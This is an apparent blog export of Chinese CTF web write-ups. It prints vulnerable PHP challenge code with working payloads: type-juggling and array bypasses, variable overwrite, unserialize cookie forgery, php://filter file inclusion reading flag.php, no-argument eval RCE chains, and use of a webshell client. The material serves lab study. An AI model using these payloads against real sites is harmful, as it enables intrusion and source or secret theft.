<h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>extract(array,extract_rules,prefix)<br>从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>其中第二个参数extract_rules是可选参数，将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>这里就是利用extract()函数变量覆盖这一漏洞<br>构造payload：?shiyan=&amp;flag= or ?shiyan=<br>这样就会将原来的flag=content=’xxx’覆盖为flag=content=NULL</p>
<h3 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>eregi():在一个字符串搜索指定的模式的字符串,搜索不区分大小写<br>第一个if语句判断id中是否包含”hackerDJ”<br>将接收到的id进行url解码，解码后要与”hackerDJ”相等<br>注意一点，将id传入时，浏览器会对id进行一次自动解码，所以要对”hackerDJ”进行两次url编码<br>payload:?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</p>
<h3 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>要想拿到flag,传入的username和password在值上不能相等，但是在md5()处理后要相等。<br>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>| QNKCDZO | 240610708 | s878926199a | s155964671a | s214587387a |<br>测试后发现不行，才发现这里的md5判断用的”===”,无法利用0e<br>在PHP中，MD5是不能处理数组的，md5(数组)会返回null<br>于是构造payload:?username[]=abc&amp;password[]=123</p>
<h3 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?die(<span class="string">"no numeric"</span>):NULL;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;1336)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>password既要不是数字，还要大于1336，两种方法绕过<br>0、利用数组绕过，即?password[]=123<br>1、选个大于1336的数字，在后面加个字符使其成为字符串，?password=1337a</p>
<h3 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump(<span class="variable">$_GET</span>[<span class="string">'name'</span>]);</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>;</span><br><span class="line">        var_dump(<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line">        var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]));</span><br><span class="line">        var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Your password can not be your name!'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Invalid password.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Login first!'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>直接数组绕过<br>payload:?name[]=a&amp;password[]=b</p>
<h3 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="keyword">function</span> noother_says_correct(<span class="variable">$temp</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">        <span class="variable">$one</span> = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值 49</span><br><span class="line">        <span class="variable">$nine</span> = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值 57</span><br><span class="line">        <span class="variable">$number</span> = <span class="string">'3735929054'</span>; </span><br><span class="line">        // Check all the input characters!</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++) //0-9</span><br><span class="line">        &#123;</span><br><span class="line">            // Disallow all the digits!</span><br><span class="line">            <span class="variable">$digit</span> = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                // Aha, digit not allowed!</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"flase"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$number</span> == <span class="variable">$temp</span>)</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="built_in">echo</span> noother_says_correct(<span class="variable">$temp</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>传入password，要使其与3735929054相等，同时每一位都不能在1-9之间<br>其中ord()函数如果参数为null,则会返回0，此处如果传入的为16进制编码后的password,php转码时会自动将16进制转为10进制。<br>其中$temp($i)对16进制进行操作时，会被处理成null<br>因此可将”3735929054”进行16进制编码后再传入<br>构造payload:?password=0xdeadc0de</p>
<h3 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">"xxx"</span>;</span><br><span class="line">    <span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'-'</span>) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">            &#123;</span><br><span class="line">                die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">echo</span>(<span class="string">'- have not been found'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>method1:利用数组绕过正则<br>ereg()和strpos()都无法处理数组，会返回null<br>payload:?password[]=a<br>method2:ereg()%00截断漏洞<br>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>并且位数小于8的同时还要大于9999999，这里可以利用科学计数法绕过，即1e7=10000000大于9999999<br>而且还要在password中匹配到”<em>-</em>“,这里可能是题目代码给错了，代码中给的”-“,发现提示说没匹配到”<em>-</em>“,应该是放题目的时候手误了<br>payload:?password=1e8%00<em>-</em></p>
<h3 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"POST"</span> == <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">        //preg_match — 执行一个正则表达式匹配</span><br><span class="line">        <span class="keyword">if</span> (0 &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, <span class="variable">$password</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'flag'</span>;</span><br><span class="line">            <span class="built_in">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$reg</span> = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">            <span class="keyword">if</span> (6 &gt; preg_match_all(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            <span class="variable">$c</span> = 0;</span><br><span class="line">            <span class="variable">$ps</span> = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">            foreach (<span class="variable">$ps</span> as <span class="variable">$pt</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">"/[[:<span class="variable">$pt</span>:]]+/"</span>, <span class="variable">$password</span>))</span><br><span class="line">                    <span class="variable">$c</span> += 1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$c</span> &lt; 3) <span class="built_in">break</span>; //&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"42"</span> == <span class="variable">$password</span>) </span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">            <span class="built_in">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>method1:数组绕过<br>payload:password[]=1<br>method2:科学计数法绕过<br>payload:password=42.000000000000e-0</p>
<h3 id="flag-php-Hint-hint"><a href="#flag-php-Hint-hint" class="headerlink" title="flag.php(Hint:hint)"></a>flag.php(Hint:hint)</h3><p>第一个页面有个登陆框，输入后点击登陆没反应，题目提示是hint,尝试传入hint,页面出现php代码，看来是代码审计<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize(<span class="variable">$cookie</span>) === <span class="string">"<span class="variable">$KEY</span>"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$flag</span>"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=<span class="string">"container"</span> align=<span class="string">"center"</span>&gt;</span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> <span class="built_in">type</span>=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> <span class="built_in">type</span>=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> <span class="built_in">type</span>=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>看到unserialize就知道是反序列化问题了<br>根据代码意思，是让cookie参数ISecer的值反序列化后等于$KEY的值<br>代码最下面就给出了$KEY的值，测试过后并没成功<br>继续分析源码，发现$KEY在反序列化比较前并没有被赋值，下面的赋值对上面的if判断没有作用，所以此时的$KEY的值应该为null(空)，而serialize(“”)=s:0:””;<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Bugku-Web/flagphp.PNG" alt=""><br>返回第一个页面刷新即可拿到flag</p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF-Web</title>
    <url>/post/e9141edc.html</url>
    <content><![CDATA[<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p><img src="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG" alt=""><br>一个登陆框，登录名应该是admin，直接爆破<br>密码爆破后为123<br>登陆成功，拿到flag</p>
<h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>f12查看源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>开始以为echo出的就是flag,结果不是<br>那就传入参数?cat=dog,flag就出来了</p>
<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>在源码中发现<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_0.PNG" alt=""><br>点进去后<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_1.PNG" alt=""><br>进入链接后<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_2.PNG" alt=""><br>用burp抓包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_3.PNG" alt=""><br>访问secr3t.php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">"../"</span>)||stristr(<span class="variable">$file</span>, <span class="string">"tp"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"input"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>文件包含<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_4.PNG" alt=""><br>base64解码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/SecretFile/secretfile_5.PNG" alt=""></p>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_0.PNG" alt=""><br>直接用菜刀连<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Knife/Knife_1.PNG" alt=""></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_0.PNG" alt=""><br>访问Secret.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_1.PNG" alt=""><br>应该是要伪造Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_2.PNG" alt=""><br>修改UA:Syclover<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Http/Http_3.PNG" alt=""></p>
<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_0.PNG" alt=""><br>显然是文件包含<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br>base64解码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_1.PNG" alt=""></p>
<h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>根据题目，应该是考察备份文件<br>访问index.php.bak,打开后<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>php弱类型比较,$str会被处理为123<br>payload:?key=123</p>
<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令执行漏洞<br><img src="" alt=""><br>ls 没发现flag相关文件，直接cat /flag,flag就出来了</p>
<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>打开啥也没有<br>bp、dirsearch、GitHacker全上了一遍<br>在GitHacker中扫出来了index.php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                // <span class="built_in">echo</span> <span class="variable">$_GET</span>[<span class="string">'exp'</span>];</span><br><span class="line">                @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>过滤了php伪协议，使用的函数不能带参数，一些基本函数也被过滤了，明显是无参RCE<br>只能利用一些特殊函数来构造exp了<br>第一步，扫描当前目录<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GXYCTF2019_REC/rce.jpg" alt=""><br>此时flag.php在数组中的第三个，接下来就是要想办法读取flag.php的内容<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><br>current(localeconv())来构造出获取当前目录的’.’<br>array_reverse():以相反的元素顺序返回数组<br>next():将内部指针指向数组中的下一个元素，并输出<br>highlight_file():打印输出或者返回文件中语法高亮的代码</p>
